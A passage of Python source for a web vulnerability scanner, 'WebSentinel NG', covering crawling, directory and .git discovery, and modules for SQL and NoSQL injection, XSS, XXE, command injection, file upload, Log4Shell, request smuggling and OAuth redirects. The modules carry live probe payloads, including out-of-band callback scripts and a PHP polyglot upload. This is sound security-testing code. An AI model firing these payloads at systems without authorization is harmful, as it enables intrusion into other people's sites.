                evidence=", ".join(p.onattrs[:4]),url=url)
        if depth<ctx.cfg.max_depth:
            for l in p.links:
                full=urllib.parse.urljoin(r.final_url or url,l.split("#")[0])
                if in_scope(ctx.cfg,full) and urllib.parse.urlunsplit(urllib.parse.urlsplit(full)[:4]+("",)) not in ctx.seen:
                    q.append((full,depth+1))
    await ctx.fact("crawled",len(ctx.pages))

@module("browser","discovery","Discovery",default=False)
async def m_browser(ctx:Context) -> None:
    """Optional Playwright SPA crawl: renders JS and captures network endpoints."""
    try: pw=importlib.import_module("playwright.async_api")
    except Exception: out("Playwright not installed - browser module skipped (pip install playwright)","WARN"); return
    try:
        async with pw.async_playwright() as p:
            br=await p.chromium.launch(headless=True); page=await br.new_page()
            urls=set()
            def on_resp(resp:Any) -> None:
                u=resp.url
                if in_scope(ctx.cfg,u) and not any(u.lower().endswith(x) for x in (".css",".png",".jpg",".woff",".ico")):
                    urls.add(u)
            page.on("response",on_resp)
            await page.goto(ctx.cfg.target,wait_until="networkidle",timeout=int(ctx.cfg.timeout*1000))
            for _ in range(min(8,ctx.cfg.max_depth)):
                links=await page.eval_on_selector_all("a[href]","els => els.map(e => e.href)")
                new=[l for l in links if in_scope(ctx.cfg,l) and l not in ctx.seen]
                if not new: break
                with contextlib.suppress(Exception):
                    await page.goto(new[0],wait_until="networkidle",timeout=int(ctx.cfg.timeout*1000))
            title=await page.title()
            await ctx.fact("browser_title",title)
            await ctx.fact("browser_urls",sorted(urls)[:200])
            await ctx.find("INFO","Discovery",f"Browser crawl: {len(urls)} network requests",
                detail=f"Title: {title}",url=ctx.cfg.target)
            await br.close()
    except Exception as e: out(f"Browser crawl failed: {e}","WARN")

@module("jsanalysis","discovery","Discovery")
async def m_js(ctx:Context) -> None:
    scripts=set()
    for p in ctx.pages:
        for s in p["scripts"]: scripts.add(urllib.parse.urljoin(p["url"],s))
        for l in p["links"]:
            if l.lower().endswith(".js"): scripts.add(urllib.parse.urljoin(p["url"],l))
    eps=set(); secs=[]
    for js in list(scripts)[:40]:
        r=await ctx.http.request(js)
        if r.status!=200 or not r.body: continue
        eps.update(re.findall(r"[\"'](/(?:api|v\d|rest|graphql|admin|internal)/[\w/{}\-.]*)[\"']",r.body))
        eps.update(re.findall(r"https?://[\w.\-]+/[\w/.\-]{3,}",r.body))
        for n,p in SECRET_PATTERNS.items():
            for m in re.findall(p,r.body): secs.append(f"{n}: {sanitize(m,60)}")
        sm=await ctx.http.request(js+".map")
        if sm.status==200 and sm.body:
            await ctx.find("MEDIUM","Sensitive","Source map exposed",f"{js}.map downloadable.",
                url=sm.final_url,remediation="Remove .map files from production.")
    if eps:
        await ctx.fact("js_endpoints",sorted(eps)[:200])
        await ctx.find("INFO","Discovery",f"{len(eps)} API endpoints in JS",
            evidence=", ".join(sorted(eps)[:8]),url=ctx.root)
    if secs:
        await ctx.find("HIGH","Secrets",f"{len(secs)} secrets in JavaScript",
            evidence="; ".join(secs[:10]),url=ctx.root,
            remediation="Remove secrets from client code and rotate credentials.")

@module("dirs","discovery","Discovery")
async def m_dirs(ctx:Context) -> None:
    words=list(DIR_SMALL if ctx.cfg.wordlist=="small" else DIR_MED)
    if ctx.cfg.wordlist=="large":
        words=DIR_MED+SENSITIVE_FILES+[f"{w}.{e}" for w in ("index","config","db","backup") for e in ("php","bak","old","sql","zip")]
    if ctx.cfg.wordlist_file and os.path.isfile(ctx.cfg.wordlist_file):
        with open(ctx.cfg.wordlist_file,encoding="utf-8",errors="ignore") as fh:
            words+= [x.strip() for x in fh if x.strip() and not x.startswith("#")]
    words=list(dict.fromkeys(words)); base=ctx.cfg.target.rstrip("/")
    sem=asyncio.Semaphore(ctx.cfg.threads)
    async def probe(pth:str) -> Optional[Dict[str,Any]]:
        async with sem:
            r=await ctx.http.request(base+"/"+pth.lstrip("/"))
            if r.status is not None and r.status not in (404,410):
                return {"path":"/"+pth.lstrip("/"),"status":r.status,"len":len(r.body)}
            return None
    res=[x for x in await asyncio.gather(*[probe(w) for w in words]) if x]
    await ctx.fact("discovered_paths",res)
    for x in res:
        if x["status"]==200:
            sev="HIGH" if re.search(r"\.env|\.git|config|\.sql|backup|id_rsa|\.bak|web\.config",x["path"],re.I) else "INFO"
            await ctx.find(sev,"Sensitive" if sev=="HIGH" else "Discovery",
                f"Accessible: {x['path']}",f"HTTP {x['status']} ({x['len']}b)",url=base+x["path"])

@module("vhosts","discovery","Discovery")
async def m_vhosts(ctx:Context) -> None:
    base=await ctx.http.request(ctx.cfg.target)
    hosts=list(ctx.subdomains)[:25]+["admin","dev","test","internal","localhost"]
    hits=[]
    for h in hosts:
        r=await ctx.http.request(ctx.cfg.target,headers={"Host":h})
        if r.raw and base.raw and similarity(r.body,base.body)<0.6 and len(r.body)>100: hits.append(h)
    if hits:
        await ctx.fact("virtual_hosts",hits)
        await ctx.find("INFO","Discovery","Virtual hosts via Host header",", ".join(hits),url=ctx.root)

@module("git","discovery","Discovery")
async def m_git(ctx:Context) -> None:
    base=ctx.cfg.target.rstrip("/")
    paths=[".git/HEAD",".git/config",".git/index",".git/logs/HEAD",".git/refs/heads/master"]
    hits=[]
    for p in paths:
        r=await ctx.http.request(base+"/"+p)
        if r.status==200 and (r.body.startswith("ref:") or "[core]" in r.body or len(r.raw)>50): hits.append((p,r.body[:200]))
    if hits:
        await ctx.fact("git_files",[h[0] for h in hits])
        await ctx.find("CRITICAL","Sensitive","Exposed .git repository",
            "Repository metadata can be downloaded and decompiled for source/secrets.",
            url=base+"/.git/",evidence="; ".join(f"{p}: {sanitize(b,80)}" for p,b in hits[:3]),
            remediation="Block access to .git at the web server / CDN.")

# =========================================================================== #
#  VULNERABILITY MODULES
# =========================================================================== #

@module("auth","vuln","Auth")
async def m_auth(ctx:Context) -> None:
    if ctx.authenticated:
        await ctx.find("INFO","Auth","Authenticated scan active",
            "Session/token/cookies were applied to all requests.",url=ctx.root)
    r=await ctx.http.request(ctx.cfg.target)
    if r.status==401:
        await ctx.find("INFO","Auth","Authentication required at root",url=ctx.root)
    for path in ("admin/","administrator/","wp-admin/","manager/","console/","/actuator"):
        rr=await ctx.http.request(ctx.cfg.target.rstrip("/")+"/"+path.lstrip("/"))
        if rr.status==200 and not re.search(ctx.cfg.logout_marker,rr.body[:3000],re.I):
            await ctx.find("LOW","Auth",f"Administrative interface reachable: {path}",url=rr.final_url)

@module("headers","vuln","Headers")
async def m_headers(ctx:Context) -> None:
    r=await ctx.http.request(ctx.cfg.target)
    checks={"content-security-policy":("MEDIUM","Missing CSP."),
      "strict-transport-security":("MEDIUM","Missing HSTS."),
      "x-frame-options":("MEDIUM","Missing clickjacking protection."),
      "x-content-type-options":("LOW","Missing nosniff."),
      "referrer-policy":("LOW","Missing Referrer-Policy."),
      "permissions-policy":("LOW","Missing Permissions-Policy.")}
    for k,(sev,d) in checks.items():
        if k not in {x.lower() for x in r.headers}:
            await ctx.find(sev,"Headers",f"Missing {k}",d,url=r.final_url,
                remediation=f"Add {k} response header.")
    csp=r.get("Content-Security-Policy")
    for bad in ("unsafe-inline","unsafe-eval","default-src *","script-src *","data:"):
        if csp and bad in csp.lower():
            await ctx.find("MEDIUM","Headers",f"Weak CSP: {bad}",evidence=sanitize(csp,180),url=r.final_url)
    if "cross-origin-opener-policy" not in {x.lower() for x in r.headers}:
        await ctx.find("LOW","Headers","Missing Cross-Origin-Opener-Policy",
            "Reverse-tabnabbing protection absent.",url=r.final_url)

@module("cookies","vuln","Cookies")
async def m_cookies(ctx:Context) -> None:
    r=await ctx.http.request(ctx.cfg.target)
    raw=r.get("Set-Cookie")
    cooks=[x.strip() for x in re.split(r",\s*(?=[A-Za-z0-9_\-]+\s*=)",raw)] if raw else []
    for cv in cooks:
        low=cv.lower(); miss=[f for f in ("secure","httponly","samesite") if f not in low]
        if miss:
            await ctx.find("MEDIUM","Cookies",f"Cookie missing {', '.join(miss)}",
                evidence=sanitize(cv,140),url=r.final_url,
                remediation="Set Secure, HttpOnly and SameSite on every cookie.")

@module("cors","vuln","CORS")
async def m_cors(ctx:Context) -> None:
    r=await ctx.http.request(ctx.cfg.target,headers={"Origin":"https://evil.example"})
    acao=r.get("Access-Control-Allow-Origin"); acac=r.get("Access-Control-Allow-Credentials")
    if acao=="https://evil.example":
        await ctx.find("HIGH" if acac.lower()=="true" else "MEDIUM","CORS",
            "CORS reflects arbitrary Origin",f"ACAO={acao} ACAC={acac}",url=r.final_url)
    elif acao=="null":
        await ctx.find("MEDIUM","CORS","CORS allows null origin",url=r.final_url)
    elif acao=="*" and acac.lower()=="true":
        await ctx.find("HIGH","CORS","Wildcard CORS with credentials",url=r.final_url)

@module("methods","vuln","Misconfig")
async def m_methods(ctx:Context) -> None:
    allowed=[]
    for m in ("GET","POST","PUT","DELETE","PATCH","OPTIONS","TRACE","CONNECT"):
        r=await ctx.http.request(ctx.cfg.target,method=m)
        if r.status is not None and r.status<400: allowed.append(m)
    await ctx.fact("http_methods",allowed)
    for m in ("PUT","DELETE","TRACE","CONNECT"):
        if m in allowed:
            await ctx.find("HIGH","Misconfig",f"Dangerous method allowed: {m}",url=ctx.cfg.target)

@module("sqli","vuln","SQLi")
async def m_sqli(ctx:Context) -> None:
    f=Fuzzer(ctx)
    for t in ctx.targets[:ctx.cfg.max_targets]:
        if not ctx.consume(6): break
        p=t["params"][0]["name"]; base=await f.baseline(t)
        for pl in ["'","' OR '1'='1",'" OR 1=1--',"1' AND '1'='2","1;WAITFOR DELAY '0:0:6'--"]:
            u,r=await f.send(t,p,pl); er=f.err(r.body)
            if er:
                await ctx.find("CRITICAL","SQLi","SQL injection (error-based)",
                    f"DB error on '{p}'.",url=u,evidence=sanitize(
                      next((l for l in r.body.splitlines() if re.search(er,l,re.I)),""),160))
                break
            if "WAITFOR" in pl and r.elapsed_ms>base.elapsed_ms+4000:
                await ctx.find("CRITICAL","SQLi","SQL injection (time-based)",
                    f"+{round(r.elapsed_ms-base.elapsed_ms)}ms on '{p}'.",url=u)
                break
            if base.status==r.status and abs(len(r.body)-len(base.body))>250 and similarity(r.body,base.body)<0.75:
                await ctx.find("HIGH","SQLi","SQL injection (boolean/differential)",url=u,
                    evidence=f"len {len(base.body)}->{len(r.body)} sim={similarity(r.body,base.body):.2f}")
                break

@module("nosql","vuln","NoSQLi")
async def m_nosql(ctx:Context) -> None:
    f=Fuzzer(ctx)
    for t in ctx.targets[:min(10,ctx.cfg.max_targets)]:
        if not ctx.consume(4): break
        p=t["params"][0]["name"]; base=await f.baseline(t)
        for pl in ["[$ne]=1","[$gt]=",'{"a":{"$ne":null}}',"';return true;//"]:
            u,r=await f.send(t,p,pl)
            if r.status==200 and len(r.body)!=len(base.body) and "error" not in r.body.lower()[:400]:
                await ctx.find("HIGH","NoSQLi","Possible NoSQL injection",
                    f"Operator altered response on '{p}'.",url=u,evidence=sanitize(pl,80)); break

@module("xss","vuln","XSS")
async def m_xss(ctx:Context) -> None:
    f=Fuzzer(ctx)
    for t in ctx.targets[:min(20,ctx.cfg.max_targets)]:
        if not ctx.consume(6): break
        p=t["params"][0]["name"]
        for pl in XSS_PAYLOADS:
            u,r=await f.send(t,p,pl)
            if f.refl(pl,r.body):
                await ctx.find("MEDIUM","XSS","Reflected XSS (potential)",
                    f"Payload reflected on '{p}'.",url=u,evidence=sanitize(pl,90),
                    remediation="Contextually encode output; enforce strict CSP."); break
        if ctx.oob:
            tok=ctx.oob.token
            u,r=await f.send(t,p,f'"><script src=//{ctx.cfg.host}:{ctx.cfg.oob_http_port}/{tok}.js></script>')
            await asyncio.sleep(0.3)
            if ctx.oob.hits():
                await ctx.find("CRITICAL","XSS","Blind XSS confirmed (OOB)",url=u)

@module("domxss","vuln","XSS")
async def m_domxss(ctx:Context) -> None:
    sink=r"document\.(write|writeln)|\.innerHTML\s*=|eval\s*\(|location\s*=|dangerouslySetInnerHTML"
    for p in ctx.pages:
        r=await ctx.http.request(p["url"]); h=re.findall(sink,r.body[:200000])
        if h: await ctx.find("LOW","XSS","DOM XSS sinks",evidence=", ".join(sorted(set(h))[:6]),url=p["url"])

@module("ssti","vuln","SSTI")
async def m_ssti(ctx:Context) -> None:
    f=Fuzzer(ctx)
    for t in ctx.targets[:min(12,ctx.cfg.max_targets)]:
        if not ctx.consume(7): break
        p=t["params"][0]["name"]
        for pl in SSTI_PAYLOADS:
            u,r=await f.send(t,p,pl)
            if re.search(r"\b49\b",r.body) or "aaaaaaa" in r.body or "Runtime" in r.body:
                await ctx.find("CRITICAL","SSTI","Server-side template injection",
                    f"Template evaluated on '{p}'.",url=u,evidence=sanitize(pl,60)); break

@module("cmdi","vuln","CMDi")
async def m_cmdi(ctx:Context) -> None:
    f=Fuzzer(ctx)
    for t in ctx.targets[:min(12,ctx.cfg.max_targets)]:
        if not ctx.consume(5): break
        p=t["params"][0]["name"]; base=await f.baseline(t)
        for pl in CMDI_PAYLOADS:
            u,r=await f.send(t,p,pl)
            if "WSMARK" in r.body:
                await ctx.find("CRITICAL","CMDi","OS command injection (output)",url=u,evidence=sanitize(pl,70)); break
            if "sleep" in pl and r.elapsed_ms>base.elapsed_ms+4500:
                await ctx.find("CRITICAL","CMDi","OS command injection (time-based)",url=u,
                    evidence=f"{round(base.elapsed_ms)}->{round(r.elapsed_ms)}ms"); break

@module("lfi","vuln","LFI")
async def m_lfi(ctx:Context) -> None:
    f=Fuzzer(ctx)
    for t in ctx.targets[:min(12,ctx.cfg.max_targets)]:
        if not ctx.consume(7): break
        p=t["params"][0]["name"]
        for pl in LFI_PAYLOADS:
            u,r=await f.send(t,p,pl)
            if re.search(r"root:x:0:0:|\[extensions\]|PD9waHA",r.body):
                await ctx.find("HIGH","LFI","Local file inclusion",f"File read via '{p}'.",url=u,
                    evidence=sanitize(pl,90)); break

@module("log4shell","vuln","CVE")
async def m_log4shell(ctx:Context) -> None:
    hdrs=[k for k in ctx.cfg.extra_headers]
    f=Fuzzer(ctx)
    for t in ctx.targets[:min(10,ctx.cfg.max_targets)]:
        if not ctx.consume(4): break
        p=t["params"][0]["name"]
        for pl in LOG4SHELL[:2]:
            u,r=await f.send(t,p,pl)
            if ctx.oob and ctx.oob.hits():
                await ctx.find("CRITICAL","CVE","Log4Shell (CVE-2021-44228) confirmed",
                    "JNDI lookup triggered OOB callback.",url=u,evidence=pl,
                    remediation="Upgrade Log4j to 2.17.1+.",cwe="CWE-1104"); return
    if ctx.oob:
        for h in ("User-Agent","X-Api-Version","Referer"):
            await ctx.http.request(ctx.cfg.target,headers={h:LOG4SHELL[0]})
        await asyncio.sleep(0.5)
        if ctx.oob.hits():
            await ctx.find("CRITICAL","CVE","Log4Shell via HTTP header",
                url=ctx.cfg.target,evidence=LOG4SHELL[0])

@module("spring4shell","vuln","CVE")
async def m_spring(ctx:Context) -> None:
    for pl in SPRINGSHELL:
        k,v=pl.split("=",1)
        r=await ctx.http.request(ctx.cfg.target,method="POST",body=f"{k}={v}".encode(),
            headers={"Content-Type":"application/x-www-form-urlencoded"})
        if r.status and r.status>=500 and re.search(r"class\.module|classLoader",r.body,re.I):
            await ctx.find("CRITICAL","CVE","Spring4Shell / Spring Cloud Function RCE candidate",
                url=ctx.cfg.target,evidence=sanitize(pl,100)); return

@module("debugmodes","vuln","Misconfig")
async def m_debug(ctx:Context) -> None:
    paths=["?debug=true","/_wdt","/phpunit/","/actuator/env","/trace","/admin/debug","/?_debug=1","/graphiql"]
    for path in paths:
        r=await ctx.http.request(ctx.cfg.target.rstrip("/")+path)
        for name,pat in DEBUG_SIGS.items():
            if re.search(pat,r.body[:20000],re.I):
                await ctx.find("HIGH","Misconfig",f"Debug mode exposed: {name}",url=r.final_url,
                    evidence=sanitize(path,80),remediation="Disable debug/profiler endpoints in production.")

@module("cloud","vuln","Cloud")
async def m_cloud(ctx:Context) -> None:
    f=Fuzzer(ctx)
    for t in ctx.targets[:min(8,ctx.cfg.max_targets)]:
        if not ctx.consume(len(CLOUD_TARGETS)): break
        p=t["params"][0]["name"]
        for tgt in CLOUD_TARGETS:
            u,r=await f.send(t,p,tgt)
            if ctx.oob and ctx.oob.hits():
                await ctx.find("CRITICAL","SSRF","SSRF confirmed via OOB",url=u,evidence=tgt); return
            if re.search(r"root:x:0:0:|ami-id|instance-id|access_key|SecretAccessKey",r.body,re.I):
                await ctx.find("CRITICAL","Cloud","SSRF to cloud metadata / internal service",
                    evidence=sanitize(tgt,90),url=u); return
    for path in ("/v1.16/version","/version","/api/v1/namespaces/default/pods"):
        r=await ctx.http.request(ctx.cfg.target.rstrip("/")+path)
        if r.status==200 and re.search(r"kubernetes|major|gitVersion",r.body,re.I):
            await ctx.find("CRITICAL","Cloud","Exposed Kubernetes API",url=r.final_url)

@module("xxe","vuln","XXE")
async def m_xxe(ctx:Context) -> None:
    for p in ctx.pages[:8]:
        for form in p.get("forms",[]):
            act=urllib.parse.urljoin(p["url"],form["action"]) or p["url"]
            for inp in form["inputs"]:
                xml=f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:{ctx.cfg.oob_http_port}/{ctx.oob.token if ctx.oob else "x"}">]><r>&x;</r>'
                r=await ctx.http.request(act,method="POST",
                    body=f'{inp["name"]}={urllib.parse.quote(xml)}'.encode(),
                    headers={"Content-Type":"application/x-www-form-urlencoded"})
                if "root:x:0:0:" in r.body:
                    await ctx.find("CRITICAL","XXE","XXE file disclosure",url=act); return
                if ctx.oob and ctx.oob.hits():
                    await ctx.find("CRITICAL","XXE","XXE confirmed via OOB",url=act); return

@module("upload","vuln","Upload")
async def m_upload(ctx:Context) -> None:
    for p in ctx.pages[:10]:
        forms=[f for f in p.get("forms",[]) if "file" in [i["type"] for i in f["inputs"]]]
        for form in forms:
            act=urllib.parse.urljoin(p["url"],form["action"]) or p["url"]
            field=next((i["name"] for i in form["inputs"] if i["type"]=="file"),"file")
            boundary="----WSBoundary"
            polyglot=b'GIF89a<?php echo "WS_UPLOAD_TEST"; ?>'
            body=(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{field}\"; filename=\"test.gif\"\r\n"
                  f"Content-Type: image/gif\r\n\r\n").encode()+polyglot+f"\r\n--{boundary}--\r\n".encode()
            r=await ctx.http.request(act,method="POST",body=body,
                headers={"Content-Type":f"multipart/form-data; boundary={boundary}"})
            if re.search(r"upload.*(success|ok)|WS_UPLOAD_TEST|/uploads/",r.body,re.I):
                await ctx.find("MEDIUM","Upload","Unrestricted file upload endpoint",
                    "Server accepted a polyglot GIF/PHP file.",url=act,
                    remediation="Validate extensions, MIME and content; store outside webroot.")

@module("csrf","vuln","CSRF")
async def m_csrf(ctx:Context) -> None:
    for p in ctx.pages[:12]:
        for form in p.get("forms",[]):
            if form["method"]!="POST": continue
            names=" ".join(i["name"].lower() for i in form["inputs"])
            if not re.search(r"csrf|xsrf|token|nonce",names):
                await ctx.find("LOW","CSRF","POST form without anti-CSRF token",
                    f"action={form['action']}",url=p["url"],
                    remediation="Add synchronizer tokens and SameSite cookies.")

@module("redirect","vuln","Redirect")
async def m_redirect(ctx:Context) -> None:
    f=Fuzzer(ctx)
    for t in ctx.targets[:min(15,ctx.cfg.max_targets)]:
        if not ctx.consume(3): break
        p=t["params"][0]["name"]
        for pl in REDIR_PAYLOADS:
            u,r=await f.send(t,p,pl)
            loc=r.get("Location") or ""
            if "evil.example" in loc or "evil.example" in r.body[:2000]:
                await ctx.find("MEDIUM","Redirect","Open redirect",f"Location: {loc}",url=u)

@module("oauth","vuln","OAuth")
async def m_oauth(ctx:Context) -> None:
    f=Fuzzer(ctx)
    pats=["redirect_uri","return_uri","callback","returnTo"]
    for p in ctx.pages[:10]:
        for l in p["links"]:
            if re.search(r"oauth|authorize|sso|login",l,re.I):
                for param in pats:
                    u=f.inject(l,param,"https://evil.example/cb")
                    r=await ctx.http.request(u)
                    if "evil.example" in r.get("Location","") or "evil.example" in r.body[:2000]:
                        await ctx.find("HIGH","OAuth","OAuth redirect_uri bypass",url=u,
                            remediation="Strictly allow-list registered redirect URIs.")

@module("idor","vuln","IDOR")
async def m_idor(ctx:Context) -> None:
    urls=[p["url"] for p in ctx.pages]+[t["url"] for t in ctx.targets]
    done=0
    for u in urls[:30]:
        m=re.search(r"/(\d{2,})|id=(\d+)|user[_-]?id=(\d+)",u)
        if not m: continue
        old=next(g for g in m.groups() if g); new=str(int(old)+1) if old.isdigit() else "2"
        test=u.replace(old,new,1)
        if test==u or done>15: continue
        done+=1
        a=await ctx.http.request(u); b=await ctx.http.request(test)
        if a.status==200 and b.status==200 and a.body and b.body and similarity(a.body,b.body)<0.85:
            await ctx.find("MEDIUM","IDOR","Potential IDOR / BOLA",
                f"ID {old}->{new} returned different data.",url=test,
                remediation="Enforce object-level authorization.")

@module("race","vuln","Race",default=False)
async def m_race(ctx:Context) -> None:
    for p in ctx.pages[:6]:
        for form in p.get("forms",[]):
            if form["method"]!="POST": continue
            act=urllib.parse.urljoin(p["url"],form["action"]) or p["url"]
            body="&".join(f"{i['name']}={i['value']}" for i in form["inputs"]).encode()
            rs=await asyncio.gather(*[ctx.http.request(act,method="POST",body=body) for _ in range(8)],
                                    return_exceptions=True)
            codes=collections.Counter(getattr(x,"status",0) for x in rs if not isinstance(x,Exception))
            if len(codes)>2:
                await ctx.find("MEDIUM","Race","Possible race condition on state-changing form",
                    f"Statuses: {dict(codes)}",url=act)

@module("websocket","discovery","Discovery")
async def m_ws(ctx:Context) -> None:
    eps=set()
    for p in ctx.pages:
        r=await ctx.http.request(p["url"])
        eps.update(re.findall(r"wss?://[\w.\-:/]+[\w/.\-]*",r.body[:200000]))
    if eps:
        await ctx.fact("websockets",sorted(eps)[:50])
        await ctx.find("INFO","Discovery",f"{len(eps)} WebSocket endpoints found",
            evidence=", ".join(sorted(eps)[:5]),url=ctx.root)

@module("smuggling","vuln","Smuggling")
async def m_smuggling(ctx:Context) -> None:
    r1=await ctx.http.request(ctx.cfg.target,method="POST",body=b"0\r\n\r\nG",
        headers={"Content-Type":"application/x-www-form-urlencoded","Transfer-Encoding":"chunked","Content-Length":"6"},follow=False)
    r2=await ctx.http.request(ctx.cfg.target,method="POST",body=b"x=1",
        headers={"Content-Type":"application/x-www-form-urlencoded","Content-Length":"3","Transfer-Encoding":"chunked"},follow=False)
    if (r1.status and r1.status>=400) or (r2.status and r2.status>=400):
        await ctx.find("MEDIUM","Smuggling","Ambiguous CL/TE handling",
            "Investigate CL.TE / TE.CL manually.",url=ctx.cfg.target)

@module("crlf","vuln","Smuggling")
async def m_crlf(ctx:Context) -> None:
    f=Fuzzer(ctx)
    for t in ctx.targets[:min(8,ctx.cfg.max_targets)]:
        if not ctx.consume(2): break
        p=t["params"][0]["name"]; u,r=await f.send(t,p,"%0d%0aX-Injected:%20yes")
        if "x-injected" in {k.lower() for k in r.headers}:
            await ctx.find("HIGH","Smuggling","CRLF header injection",url=u)

@module("hostheader","vuln","Auth")
async def m_hostheader(ctx:Context) -> None:
    r=await ctx.http.request(ctx.cfg.target,headers={"Host":"evil.example"})
    if "evil.example" in r.body:
        await ctx.find("MEDIUM","Auth","Host header reflected",url=ctx.cfg.target)

@module("jwt","vuln","JWT")
async def m_jwt(ctx:Context) -> None:
    toks=set(); r=await ctx.http.request(ctx.cfg.target)
    for k,v in r.headers.items():
        if k.lower() in ("set-cookie","authorization"):
            toks.update(re.findall(r"eyJ[\w\-]{10,}\.eyJ[\w\-]{10,}\.[\w\-]{10,}",v))
    for p in ctx.pages[:10]:
        pr=await ctx.http.request(p["url"])
        toks.update(re.findall(r"eyJ[\w\-]{10,}\.eyJ[\w\-]{10,}\.[\w\-]{10,}",pr.body[:200000]))
    for tok in list(toks)[:8]:
        for iss in analyze_jwt(tok):
            await ctx.find(iss["t"],"JWT",iss["title"],iss["d"],url=ctx.cfg.target,
                evidence=sanitize(tok,70),cwe=iss.get("cwe",""))

@module("graphql","vuln","GraphQL")
async def m_graphql(ctx:Context) -> None:
    for ep in (ctx.cfg.target.rstrip("/")+"/graphql",ctx.cfg.target.rstrip("/")+"/api/graphql"):
        q=b'{"query":"{__schema{types{name}}}"}'
        r=await ctx.http.request(ep,method="POST",body=q,headers={"Content-Type":"application/json"})
        if r.status==200 and "__schema" in r.body:
            await ctx.find("MEDIUM","GraphQL","GraphQL introspection enabled",url=ep,
                remediation="Disable introspection in production.")
        d=await ctx.http.request(ep+"?query=%7B__typename%7D")
        if d.status==200 and "__typename" in d.body:
            await ctx.find("LOW","GraphQL","GraphQL allows GET (CSRF)",url=ep)

@module("api","discovery","Discovery")
async def m_api(ctx:Context) -> None:
    for path in ("/swagger/v1/swagger.json","/openapi.json","/api-docs","/swagger.json","/v2/api-docs"):
        r=await ctx.http.request(ctx.cfg.target.rstrip("/")+path)
        if r.status==200 and re.search(r'"(swagger|openapi|paths)"',r.body[:1000],re.I):
            with contextlib.suppress(Exception):
                d=json.loads(r.body); paths=list(d.get("paths",{}).keys())
                await ctx.fact("api_spec",{"url":r.final_url,"paths":paths[:200]})
                await ctx.find("INFO","Discovery",f"API spec exposed: {len(paths)} paths",url=r.final_url)

@module("sensitive","vuln","Secrets")
async def m_sensitive(ctx:Context) -> None:
    for p in ctx.pages[:20]:
        r=await ctx.http.request(p["url"])
        for n,pat in SECRET_PATTERNS.items():
            h=re.findall(pat,r.body[:300000])
            if h:
                await ctx.find("HIGH","Secrets",f"{n} exposed in response",
                    evidence=sanitize(str(h[0]),100),url=p["url"])

@module("takeover","post","Misconfig")
async def m_takeover(ctx:Context) -> None:
    fp={"GitHub Pages":r"404.*not found|There isn't a GitHub Pages site here",
        "Heroku":r"No Such App","AWS S3":r"NoSuchBucket|specified bucket does not exist",
        "Fastly":r"Fastly error: unknown domain","Cloudfront":r"request could not be satisfied"}
    for sub in list(ctx.subdomains)[:40]:
        r=await ctx.http.request("https://"+sub)
        for svc,pat in fp.items():
            if re.search(pat,r.body[:5000],re.I):
                await ctx.find("HIGH","Misconfig",f"Subdomain takeover: {sub}",
                    f"Matches {svc}.",url="https://"+sub)

# =========================================================================== #
#  Engine + browser hooks + multi-target
# =========================================================================== #

def banner() -> None:
    print(f"{M}{BD}╔══════════════════════════════════════════════════════════════╗{Z}")
    print(f"{M}{BD}║  WebSentinel NG v{VERSION} — Next-Gen Web Attack Surface     ║{Z}")
    print(f"{M}{BD}║  async · auth · OOB · CVE · SPA · PoC · SARIF · CI-ready    ║{Z}")
    print(f"{M}{BD}╚══════════════════════════════════════════════════════════════╝{Z}")
    print(f"{Y}[!] AUTHORIZED USE ONLY — hostile payloads will be logged.{Z}\n")

def out(msg: str, level: str="INFO") -> None:
    clr={"INFO":B,"OK":G,"WARN":Y,"ERROR":R,"DEBUG":M}.get(level,B)
    print(f"{clr}[{level}]{Z} {msg}",flush=True)

class Engine:
    def __init__(self,cfg:Config) -> None:
        self.cfg=cfg; self.http=AsyncHTTP(cfg); self.dns=AsyncDNS(cfg)
        self.report=Report(target=cfg.target)
        self.oob=OOBServer(cfg) if cfg.oob else None
        p=urllib.parse.urlsplit(cfg.target)
        self.ctx=Context(cfg,self.http,self.dns,self.report,self.oob,p,
            urllib.parse.urlunsplit((p.scheme,p.netloc,"/","","")))

    async def run(self) -> Report:
        loop=asyncio.get_running_loop()
        def _quiet(l:Any,ctx:Dict[str,Any]) -> None:
            if isinstance(ctx.get("exception"),ConnectionResetError): return
            l.default_exception_handler(ctx)
        loop.set_exception_handler(_quiet)
        out(f"Target: {self.cfg.target}","SCAN")
        out(f"Profile: {self.cfg.profile} | modules: {len(self.enabled())}","SCAN")
        try:
            ips=await self.dns.query(self.cfg.host,"A")
            if ips: await self.report.fact("a_records",ips); out(f"A: {', '.join(ips[:5])}","OK")
        except Exception: pass
        if self.oob:
            await self.oob.start()
            out(f"OOB HTTP :{self.cfg.oob_http_port} / DNS :{self.cfg.oob_dns_port} token={self.oob.token}","OK")
        first=await self.http.request(self.cfg.target)
        if first.error and self.cfg.scheme=="https":
            alt=self.cfg.target.replace("https://","http://",1)
            out("HTTPS failed, trying HTTP...","WARN")
            if not (await self.http.request(alt)).error:
                self.cfg.scheme="http"; self.cfg.target=alt; self.ctx.root=alt
        await do_login(self.ctx)
        for phase in ("recon","discovery","vuln","post"):
            mods=[m for m in self.enabled() if m["phase"]==phase]
            if not mods: continue
            out(f"Phase {phase.upper()} ({len(mods)} modules)","SCAN")
            sem=asyncio.Semaphore(max(2,self.cfg.threads//2))
            async def one(m:Dict[str,Any]) -> None:
                async with sem:
                    if self.cfg.verbose: out(f"  -> {m['name']}","DEBUG")
                    try: await m["fn"](self.ctx)
                    except asyncio.CancelledError: raise
                    except Exception as e:  # noqa: BLE001
                        out(f"  {m['name']}: {type(e).__name__}: {e}","WARN")
            await asyncio.gather(*[one(m) for m in mods])
        if self.oob: await self.oob.stop()
        self.report.finalize(); return self.report

    def enabled(self) -> List[Dict[str,Any]]:
        out=[]
        for m in MODULES:
            if m["name"] in self.cfg.exclude_modules: continue
            if self.cfg.modules is not None:
                if m["name"] not in self.cfg.modules: continue
            elif not m["default"]: continue
            out.append(m)
        return out

# --------------------------------------------------------------------------- #
#  Reporting
# --------------------------------------------------------------------------- #

def load_baseline(path: str) -> Set[Tuple[str,str,str,str]]:
    if not path or not os.path.isfile(path): return set()
    with contextlib.suppress(Exception):
        with open(path,encoding="utf-8-sig") as fh: d=json.load(fh)
        return {(f.get("category",""),f.get("title",""),f.get("url",""),f.get("evidence","")[:80])
                for f in d.get("findings",[])}
    return set()

def summarize(r:Report,baseline:Set[Tuple[str,str,str,str]]=None) -> None:
    print(f"\n{BD}{'='*76}{Z}")
    print(f"{BD} WebSentinel NG — EXECUTIVE SUMMARY{Z}")
    print(f" Target : {r.target}")
